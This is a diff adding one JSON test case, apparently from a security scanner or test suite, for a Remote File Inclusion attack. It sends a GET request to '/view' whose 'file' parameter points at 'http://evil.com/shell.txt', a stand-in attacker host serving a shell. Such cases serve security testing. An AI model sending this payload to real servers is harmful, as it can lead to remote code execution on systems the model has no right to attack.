@@ -1,0 +1,12 @@
+{
+    "name": "Remote File Inclusion",
+    "description": "Include remote file containing malicious code",
+    "method": "GET",
+    "endpoint": "/view",
+    "headers": {
+      "Content-Type": "application/json"
+    },
+    "parameters": {
+      "file": "http://evil.com/shell.txt"
+    }
+  }
